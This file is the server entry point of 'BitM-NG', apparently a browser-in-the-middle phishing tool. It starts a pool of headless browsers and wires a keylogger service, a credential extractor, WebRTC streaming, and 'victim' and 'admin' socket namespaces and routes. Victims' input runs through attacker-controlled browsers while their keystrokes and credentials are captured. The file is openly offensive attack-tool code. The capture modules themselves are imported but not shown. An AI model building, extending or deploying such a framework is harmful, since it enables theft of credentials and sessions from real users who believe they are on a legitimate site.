import Fastify from 'fastify';
import { Server as SocketIOServer } from 'socket.io';
import { join } from 'path';
import { config } from './config/config.js';
import { logger } from './utils/logger.js';
import { SessionManager } from './services/SessionManager.js';
import { XvfbManager } from './browser/XvfbManager.js';
import { BrowserPoolManager } from './services/BrowserPoolManager.js';
import { InputEventRouter } from './services/InputEventRouter.js';
import { KeyloggerService } from './services/KeyloggerService.js';
import { CredentialExtractor } from './services/CredentialExtractor.js';
import { WebRTCSignalingService } from './websocket/WebRTCSignalingService.js';
import { WebRTCStreamingService } from './services/WebRTCStreamingService.js';
import { setupVictimNamespace } from './websocket/namespaces/victim.js';
import { setupBrowserNamespace } from './websocket/namespaces/browser.js';
import { setupAdminNamespace } from './websocket/namespaces/admin.js';
import { setupBroadcastRoute } from './http/routes/broadcast.js';
import { setupVictimRoute } from './http/routes/victim.js';
import { setupAdminRoute } from './http/routes/admin.js';
import fastifyStatic from '@fastify/static';

// Initialize services
const xvfbManager = new XvfbManager();
const browserPoolManager = new BrowserPoolManager(xvfbManager);
const sessionManager = new SessionManager();
const keyloggerService = new KeyloggerService(sessionManager);
const credentialExtractor = new CredentialExtractor(browserPoolManager);
const inputEventRouter = new InputEventRouter(sessionManager, browserPoolManager);
const streamingService = new WebRTCStreamingService();

// Create Fastify instance
const app = Fastify({
  logger: false, // We use Winston instead
  bodyLimit: config.server.bodyLimit,
});

// Create Socket.IO server
const io = new SocketIOServer(app.server, {
  cors: {
    origin: '*', // Configure appropriately for production
    methods: ['GET', 'POST'],
  },
  path: '/socket.io',
});

// Initialize WebRTC signaling service (for ICE server config)
new WebRTCSignalingService(io);

// Setup WebSocket namespaces
setupVictimNamespace(
  io.of('/victim'),
  sessionManager,
  browserPoolManager,
  inputEventRouter,
  keyloggerService,
  streamingService
);

setupBrowserNamespace(io.of('/browser'), browserPoolManager);

setupAdminNamespace(
  io.of('/admin'),
  sessionManager,
  browserPoolManager,
  credentialExtractor,
  keyloggerService
);

// Setup static file serving for client assets
app.register(fastifyStatic, {
  root: join(process.cwd(), 'dist/client'),
  prefix: '/client/',
});

// Setup HTTP routes
setupBroadcastRoute(app);
setupVictimRoute(app);
setupAdminRoute(app);

// Basic health check endpoint
app.get('/health', async (_request, _reply) => {
  return {
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    sessions: sessionManager.getSessionCount(),
    browsers: {
      active: browserPoolManager.getActiveCount(),
      idle: browserPoolManager.getIdleCount(),
    },
  };
});

// Basic root endpoint
app.get('/', async (_request, _reply) => {
  return { message: 'BitM-NG Server', version: '1.0.0' };
});

// Graceful shutdown handler
const shutdown = async () => {
  logger.info('SIGTERM/SIGINT received, shutting down gracefully...');
  
  try {
    // Stop cleanup tasks
    browserPoolManager.stopCleanupTask();
    
    // Close all keylog files
    await keyloggerService.closeAll();
    
    // Cleanup all browsers
    await browserPoolManager.cleanupAll();
    
    // Cleanup all Xvfb instances
    await xvfbManager.cleanupAll();
    
    // Close server
    await app.close();
    io.close();
    
    logger.info('Server closed successfully');
    process.exit(0);
  } catch (error) {
    logger.error('Error during shutdown:', error);
    process.exit(1);
  }
};

process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

// Start server
const start = async () => {
  try {
    // Initialize browser pool
    await browserPoolManager.initialize();
    
    await app.listen({
      port: config.server.port,
      host: config.server.host,
    });
    
    logger.info(`🚀 Server listening on ${config.server.host}:${config.server.port}`);
    logger.info(`📡 Socket.IO server ready at /socket.io`);
    logger.info(`🎥 WebRTC signaling service initialized`);
    logger.info(`🌐 Browser pool manager ready (max: ${config.browser.maxInstances})`);
  } catch (error) {
    logger.error('Failed to start server:', error);
    process.exit(1);
  }
};

start();
